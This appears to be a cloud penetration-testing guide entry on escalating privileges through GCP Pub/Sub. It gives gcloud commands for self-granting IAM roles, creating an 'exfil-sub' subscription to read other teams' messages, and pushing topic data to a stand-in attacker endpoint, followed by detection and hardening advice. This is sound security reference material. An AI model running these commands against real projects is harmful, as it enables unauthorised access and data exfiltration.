---
cstg_id: CSTG-GCP-PUB-SUB-PRIVESC
title: "GCP Pub/Sub - Privilege Escalation"
provider: gcp
service: pub-sub
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - pubsub.topics.setIamPolicy
  - pubsub.subscriptions.setIamPolicy
  - pubsub.subscriptions.create
  - pubsub.subscriptions.consume
tools: [gcloud]
references:
  - "https://cloud.google.com/pubsub/docs/access-control"
  - "https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/"
license: CC BY-SA 4.0
---

## Summary

Pub/Sub contributes to privilege escalation primarily through **access to message data** that the
current principal should not see, and through **IAM self-grant** on Pub/Sub resources. Messages
often contain credentials, tokens, internal identifiers, or business-sensitive events; obtaining
them can extend access elsewhere. The two paths are: grant yourself rights on a topic/subscription
via `setIamPolicy`, or attach a new subscription to a topic and consume its messages.

## Prerequisites

A principal holding one of the permissions below on the relevant topic or subscription. Confirm the
current bindings first (see [Pub/Sub - Enumeration](../02-services/gcp-pub-sub-enum.md)).

## Exploitation

### `pubsub.topics.setIamPolicy` / `pubsub.subscriptions.setIamPolicy`

Grant your principal a role that allows reading or publishing, removing the original restriction.

```bash
gcloud pubsub topics add-iam-policy-binding <topic> \
  --member="user:<you>" --role="roles/pubsub.subscriber"
```

### `pubsub.subscriptions.create` + `pubsub.subscriptions.consume` (read another team's messages)

Create a new subscription against a topic you can see and pull its messages, gaining access to data
intended for other consumers.

```bash
gcloud pubsub subscriptions create exfil-sub --topic=<topic>
gcloud pubsub subscriptions pull exfil-sub --auto-ack --limit=100
```

Sensitive payloads (tokens, credentials, PII) recovered this way may enable further escalation in
other services.

### Push subscription to an attacker endpoint

With subscription-creation rights, a **push** subscription can deliver a topic's messages to an
external HTTPS endpoint, continuously forwarding data out of the project.

```bash
gcloud pubsub subscriptions create push-out --topic=<topic> \
  --push-endpoint='https://attacker.example/collector'
```

## Misconfigurations & Findings

- Principals with `setIamPolicy` on Pub/Sub resources outside administrators.
- Broad `pubsub.subscriptions.create`/`consume` allowing arbitrary access to topic data.
- Sensitive data published to topics without field-level protection.

## Detection & Logging

`SetIamPolicy` and `CreateSubscription` are **Cloud Audit Logs** Admin Activity events recording the
principal. Message `pull`/`publish` appear only with Pub/Sub Data Access audit logs enabled. Alert
on new subscriptions (especially push subscriptions to external endpoints) and IAM changes on
sensitive topics.

## Remediation & Hardening

- Restrict `setIamPolicy` and subscription-creation permissions to administrators.
- Enforce least-privilege roles per topic/subscription; avoid project-wide `pubsub.editor`.
- Keep secrets out of message payloads; use references to Secret Manager instead.
- Constrain push endpoints (allowed domains) and enable Data Access audit logs to record consumption.

## Tools

- **gcloud** - perform and verify IAM and subscription operations for testing and review.

## References

- Google Cloud - Pub/Sub access control
- Rhino Security Labs - GCP privilege escalation research
